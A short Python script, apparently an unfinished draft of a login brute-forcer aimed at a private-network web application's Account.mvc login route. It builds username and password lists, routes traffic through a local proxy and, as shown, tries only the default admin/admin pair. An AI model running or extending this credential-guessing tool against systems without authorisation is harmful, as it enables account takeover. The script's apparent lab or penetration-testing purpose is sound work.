#!/usr/bin/python3
import sys
import requests

from nousers import construct_unames, construct_passwords

default_url = "http://172.20.10.4/pwd"
login_route = "/Account.mvc/Login"
logout_route = "/Account.mvc/LogOut"

unames = construct_unames()
print("constructed {0} usernames for brute forcing...".format(len(unames)))

passwords = construct_passwords()
print("constructed {0} passwords for brute forcing...".format(len(passwords)))
prompt = "{0} web requests will be generated.  Do you want to continue?  (Y/n)  ".format(len(unames) * len(passwords))
result = input(prompt)
if not result == "Y":
    print('quitter!')
    sys.exit(0)

proxies = {'http': '127.0.0.1:8080'}

r = requests.get(default_url)

if not r.status_code == 200:
    print("Exiting:  invalid url {0}".format(default_url))
    sys.exit(1)

r = requests.post(default_url + login_route, data = {'username': 'admin', 'password': 'admin', 'Destination': ''}, proxies = proxies)
if len(r.history) == 0:
    print("invalid login")
    sys.exit(0)
print(r.history[0].status_code)